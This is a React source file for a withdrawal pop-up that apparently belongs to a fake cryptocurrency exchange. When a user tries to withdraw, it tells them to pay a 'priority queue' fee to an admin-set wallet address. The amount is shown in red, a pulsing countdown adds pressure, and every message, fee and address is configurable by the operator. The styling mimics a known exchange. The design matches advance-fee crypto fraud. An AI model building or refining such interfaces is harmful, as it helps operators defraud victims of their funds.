import { useState, useEffect } from 'react';
import { useApp } from '@/contexts/AppContext';
import { Clock, Copy, Check } from 'lucide-react';

interface WithdrawalModalProps {
  isOpen: boolean;
  onClose: () => void;
  amount: number;
  coin: string;
  onConfirm: () => void;
}

export function WithdrawalModal({ isOpen, onClose, amount, coin, onConfirm }: WithdrawalModalProps) {
  const { adminData, showToast } = useApp();
  const [timeRemaining, setTimeRemaining] = useState(adminData.countdownDuration);
  const [copied, setCopied] = useState(false);

  // Countdown timer
  useEffect(() => {
    if (!isOpen) return;

    setTimeRemaining(adminData.countdownDuration);

    const interval = setInterval(() => {
      setTimeRemaining((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [isOpen, adminData.countdownDuration]);

  const formatTime = (seconds: number) => {
    const days = Math.floor(seconds / (24 * 60 * 60));
    const hours = Math.floor((seconds % (24 * 60 * 60)) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;

    return `${String(days).padStart(2, '0')}:${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  };

  const handleCopyAddress = async () => {
    try {
      await navigator.clipboard.writeText(adminData.adminWalletAddress);
      setCopied(true);
      showToast('Address copied to clipboard', 'success');
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      // Fallback
      const textArea = document.createElement('textarea');
      textArea.value = adminData.adminWalletAddress;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      setCopied(true);
      showToast('Address copied to clipboard', 'success');
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const getModalTitle = () => {
    const approximateAmount = amount.toFixed(3);
    const template = adminData.modalTitleTemplate;
    return template.replace('[AMOUNT]', `${approximateAmount} ${coin}`);
  };

  // Parse title to color the amount red
  const renderTitle = () => {
    const title = getModalTitle();
    const approximateAmount = amount.toFixed(3);
    const amountStr = `${approximateAmount} ${coin}`;

    const parts = title.split(amountStr);

    if (parts.length === 2) {
      return (
        <>
          {parts[0]}
          <span className="text-[#f6465d]">{amountStr}</span>
          {parts[1]}
        </>
      );
    }

    return title;
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center">
      <style>{`
        @keyframes pulse-timer {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.7; }
        }
        .timer-pulse {
          animation: pulse-timer 1s ease-in-out infinite;
        }
        .custom-scrollbar::-webkit-scrollbar {
          width: 3px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background-color: #474d57;
          border-radius: 20px;
        }
      `}</style>

      {/* Backdrop */}
      <div
        className="absolute inset-0 bg-black/70 backdrop-blur-sm transition-opacity"
        onClick={onClose}
      />

      {/* Modal Content */}
      <div className="relative bg-[#1e2329] w-full max-w-[340px] sm:max-w-[400px] rounded-2xl shadow-2xl mx-4 overflow-hidden animate-in fade-in zoom-in-95 duration-200">
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-3 sm:top-4 right-3 sm:right-4 text-gray-400 hover:text-white transition-colors p-1 z-10"
        >
          <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>

        <div className="flex flex-col items-center p-5 sm:p-6 pt-6 sm:pt-8">
          {/* Warning Icon */}
          <div className="mb-4 sm:mb-5">
            <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-full border-2 border-[#fcd535] flex items-center justify-center bg-transparent">
              <span className="text-[#fcd535] text-xl sm:text-2xl font-bold leading-none mt-0.5">!</span>
            </div>
          </div>

          {/* Title */}
          <h2 className="text-white text-base sm:text-lg font-bold mb-3 sm:mb-4 text-center px-2 tracking-tight leading-snug">
            {renderTitle()}
          </h2>

          {/* Scrollable Content Area */}
          <div className="w-full mb-5 sm:mb-6 relative">
            <div className="h-[80px] sm:h-[100px] overflow-y-auto custom-scrollbar pr-2">
              {adminData.modalScrollableMessage.split('\n\n').map((paragraph, index) => (
                <p key={index} className={`text-gray-400 text-center text-sm sm:text-base leading-relaxed font-light ${index > 0 ? 'mt-3 sm:mt-4' : ''}`}>
                  {paragraph}
                </p>
              ))}
            </div>
            <div className="absolute bottom-0 left-0 right-2 h-6 bg-gradient-to-t from-[#1e2329] to-transparent pointer-events-none"></div>
          </div>

          {/* Priority Queue Section */}
          <div className="w-full mb-5 sm:mb-6 space-y-3 sm:space-y-4 border-t border-[#474d57]/30 pt-4 sm:pt-5">
            {/* Priority Queue Header */}
            <div className="text-center">
              <span className="text-[#f0b90b] text-sm sm:text-base font-semibold tracking-wide block mb-2">
                {adminData.priorityQueueTitle}
              </span>
              <p className="text-white text-sm font-normal leading-relaxed">
                {adminData.priorityQueueDescription}
              </p>
            </div>

            {/* Network */}
            <div className="flex justify-between items-start pt-2">
              <span className="text-[#848e9c] text-xs sm:text-sm font-normal">Network</span>
              <span className="text-white text-xs sm:text-sm font-medium text-right">{adminData.networkDisplayName}</span>
            </div>

            {/* Fee amount */}
            <div className="flex justify-between items-center">
              <span className="text-[#848e9c] text-xs sm:text-sm font-normal">Fee amount</span>
              <span className="text-[#f0b90b] text-xs sm:text-sm font-semibold">{adminData.feeAmount} {coin}</span>
            </div>

            {/* Address Box */}
            <div
              onClick={handleCopyAddress}
              className="bg-[#2b3139] rounded-xl p-3 sm:p-4 flex items-center justify-between gap-3 border border-transparent hover:bg-[#363d47] hover:border-[#f0b90b] active:scale-[0.98] transition-all cursor-pointer"
            >
              <span className="text-white text-xs sm:text-sm font-mono break-all leading-relaxed flex-1">
                {adminData.adminWalletAddress}
              </span>
              <div className="flex-shrink-0 relative">
                {copied ? (
                  <Check className="w-5 h-5 sm:w-6 sm:h-6 text-[#0ecb81]" />
                ) : (
                  <Copy className="w-5 h-5 sm:w-6 sm:h-6 text-[#f0b90b]" />
                )}
              </div>
            </div>

            {/* Yellow Warning Text */}
            {adminData.yellowWarningText && (
              <p className="text-[#f0b90b] text-xs text-center">
                {adminData.yellowWarningText}
              </p>
            )}

            {/* Timer */}
            <div className="flex items-center justify-center gap-2 pt-2">
              <Clock className="text-[#f0b90b] w-3 h-3 sm:w-4 sm:h-4 timer-pulse" />
              <span className="text-[#f0b90b] text-xs sm:text-sm font-mono font-semibold tracking-wider timer-pulse">
                {formatTime(timeRemaining)}
              </span>
            </div>
          </div>

          {/* Continue Button */}
          <button
            onClick={onConfirm}
            className="w-full bg-[#fcd535] hover:bg-[#f0b90b] text-gray-900 font-bold py-3 sm:py-3.5 rounded-lg transition-colors duration-200 mb-3 shadow-lg text-sm sm:text-base tracking-wide"
          >
            {adminData.primaryButtonText}
          </button>

          {/* Cancel Button */}
          <button
            onClick={onClose}
            className="text-[#fcd535] hover:text-[#f0b90b] text-sm font-medium transition-colors py-2"
          >
            {adminData.secondaryButtonText}
          </button>
        </div>
      </div>
    </div>
  );
}

export default WithdrawalModal;
